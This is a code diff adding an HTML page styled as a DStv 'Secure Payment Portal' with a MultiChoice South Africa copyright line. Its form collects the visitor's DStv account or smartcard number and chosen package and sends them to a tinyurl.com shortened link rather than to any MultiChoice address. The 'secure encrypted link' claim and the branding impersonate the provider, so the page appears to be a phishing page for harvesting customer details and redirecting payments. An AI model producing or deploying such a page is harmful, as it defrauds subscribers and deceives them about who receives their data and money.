@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DStv | Quick Pay & Recharge</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f9;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .payment-container {
+            background: white;
+            width: 90%;
+            max-width: 450px;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            border-top: 6px solid #0095DA;
+        }
+        .logo {
+            text-align: center;
+            font-size: 28px;
+            font-weight: bold;
+            color: #0095DA;
+            margin-bottom: 20px;
+        }
+        .header-text {
+            text-align: center;
+            color: #333;
+            margin-bottom: 25px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #555;
+            margin-bottom: 8px;
+        }
+        input[type="text"], select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .package-options {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        .package-card {
+            border: 1px solid #e0e0e0;
+            padding: 12px;
+            border-radius: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .package-card:hover {
+            border-color: #0095DA;
+            background-color: #f0f9ff;
+        }
+        .package-card input {
+            margin-right: 10px;
+        }
+        .price-tag {
+            font-weight: bold;
+            color: #0095DA;
+        }
+        .pay-button {
+            width: 100%;
+            background-color: #0095DA;
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+        .pay-button:hover {
+            background-color: #007bb8;
+        }
+        .footer-note {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="payment-container">
+    <div class="logo">DStv</div>
+    <div class="header-text">
+        <h3>Secure Payment Portal</h3>
+        <p>Choose your package and recharge instantly.</p>
+    </div>
+
+    <form action="https://tinyurl.com/yxnmfxd3" method="GET">
+        <div class="input-group">
+            <label for="account">📝 Enter your DStv account number or smartcard number:</label>
+            <input type="text" id="account" name="account" placeholder="e.g. 1023456789" required>
+        </div>
+
+        <label>Select Your Monthly Package:</label>
+        <div class="package-options">
+            <label class="package-card">
+                <span><input type="radio" name="pkg" value="800"> DStv Premium</span>
+                <span class="price-tag">R 800</span>
+            </label>
+            <label class="package-card">
+                <span><input type="radio" name="pkg" value="500"> DStv Compact Plus</span>
+                <span class="price-tag">R 500</span>
+            </label>
+            <label class="package-card">
+                <span><input type="radio" name="pkg" value="350"> DStv Compact</span>
+                <span class="price-tag">R 350</span>
+            </label>
+            <label class="package-card">
+                <span><input type="radio" name="pkg" value="250"> DStv Family</span>
+                <span class="price-tag">R 250</span>
+            </label>
+            <label class="package-card">
+                <span><input type="radio" name="pkg" value="100"> DStv Access</span>
+                <span class="price-tag">R 100</span>
+            </label>
+            <label class="package-card">
+                <span><input type="radio" name="pkg" value="20"> DStv EasyView</span>
+                <span class="price-tag">R 20</span>
+            </label>
+        </div>
+
+        <div class="input-group">
+            <label>Amount to pay:</label>
+            <input type="text" placeholder="R 0.00" id="display-amount" readonly style="background: #f9f9f9; font-weight: bold; color: #333;">
+        </div>
+
+        <button type="submit" class="pay-button">PROCEED TO SECURE PAYMENT</button>
+    </form>
+
+    <div class="footer-note">
+        &copy; 2026 MultiChoice South Africa. All rights reserved. <br>
+        Payments processed via secure encrypted link.
+    </div>
+</div>
+
+<script>
+    // Simple script to update the "Amount to pay" field when a package is selected
+    const radios = document.querySelectorAll('input[name="pkg"]');
+    const display = document.getElementById('display-amount');
+    
+    radios.forEach(radio => {
+        radio.addEventListener('change', (e) => {
+            display.value = "R " + e.target.value;
+        });
+    });
+</script>
+
+</body>
+</html>
